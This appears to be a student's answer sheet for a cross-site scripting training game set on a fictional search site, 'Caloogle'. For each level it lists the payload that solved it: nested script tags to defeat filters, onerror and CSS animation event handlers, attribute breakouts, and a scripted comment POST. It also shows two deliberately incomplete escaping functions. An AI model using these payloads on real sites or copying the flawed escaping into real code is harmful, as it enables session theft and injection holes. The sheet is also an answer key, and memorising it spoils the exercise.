# 0. Welcome

N/A

# 1. A Truly Disruptive Startup (3 points)

```
<script>success()</script>
```

# 2. No Script Allowed (3 points)

```
<scriptscript>success()</script>
```

# 3. One More Time, Like You Mean It (3 points)

```
<scrscriptipt>success()</scrscriptipt>
```

# 4. An Open-and-Shut Case (3 points)

```
<img src=x onerror=success()>
```

# 5. Time to Mix Things Up (3 points)

```
<img src=x onerror=success()>
```

# 6. A Picture is Worth a Thousand Words (3 points)

```
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="success()"></xss>
```

# 7. Between a Rock And a Hard Place (3 points)

```
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="success()"></xss>
```

# 8. Angle of Death (6 points)

Attack input:

```
<<script>>success()</script>
```

Server code:

```js

function htmlElementEscape (str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
}

router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  q = htmlElementEscape(q)

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 9. All in a Day's Work

N/A

# 10. In the Wrong Place at the Wrong Time (3 points)

```
" onload=success() "
```

# 11. You Can't Win 'em All (6 points)

Attack input:

```
"" onload=success() "
```

Server code:

```js

function htmlElementEscape (str) {
  return str
    .replace(/"/g, '&quot;')
}


router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
  q = htmlElementEscape(q)

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 12. When All is Said and Done (6 points)

Attack input:

```
' onload =success()
```

# 13. When You Want a Job Done Right

N/A

# 14. Here Today and Gone Tomorrow (3 points)

Attack URL:

```
http://caloogle.xyz:4140/search?lang=az%20%27%20onload=success()
```

# 15. The Early Bird Catches the Worm (3 points)

```
</script><script>success()</script>
```

# 16. Tying Up Loose Ends (3 points)

```
<<//script><script>success()<<//script>
```

# 17. Take a Page Out of Their Book (6 points)

Attack code:

```js
window.fetch('/comment', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json'},
  body: JSON.stringify({text:'success()', id:1})
}).then((response) => response.json())
.then((responseJsonData) => {
  success();
  console.log(responseJsonData)
})
```

# 18. Congrats

N/A